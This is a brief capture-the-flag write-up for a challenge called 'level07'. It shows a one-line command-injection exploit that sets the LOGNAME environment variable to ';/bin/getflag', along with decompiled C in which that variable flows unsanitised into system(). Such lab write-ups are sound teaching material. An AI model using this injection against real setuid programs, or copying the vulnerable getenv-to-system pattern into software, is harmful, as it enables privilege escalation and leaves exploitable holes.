# level07

```bash
LOGNAME=';/bin/getflag' ./level07
```

## Explanation

This one was really easy.

Opening the `./level07` executable in ghidra shows:

```C
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c,"/bin/echo %s ",pcVar1);
iVar2 = system(local_1c);
```
